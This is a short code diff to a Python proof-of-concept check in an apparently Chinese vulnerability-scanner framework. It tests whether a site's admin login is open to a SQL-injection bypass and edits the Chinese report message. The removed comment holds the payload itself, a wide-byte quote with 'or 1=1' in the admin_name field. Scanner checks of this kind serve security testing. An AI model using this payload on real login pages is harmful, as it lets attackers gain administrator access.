@@ -56,8 +56,7 @@ class Poc(ABPoc):
             code, head, res, errcode, final_url = hh.http(target, post=post)
 
             if code == 200 and "setTimeout(\"location.replace('index.php')\",'2000')" in res:
-                #security_hole(target+' && post: admin_name=hentai%d5%27%20or%201%3d1%23&admin_pwd=hentai&submit=%B5%C7%C2%BC&act=do_login')
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n具体请查看漏洞详情'.format(
                     target=self.target, name=self.vuln.name))
 
         except Exception as e:
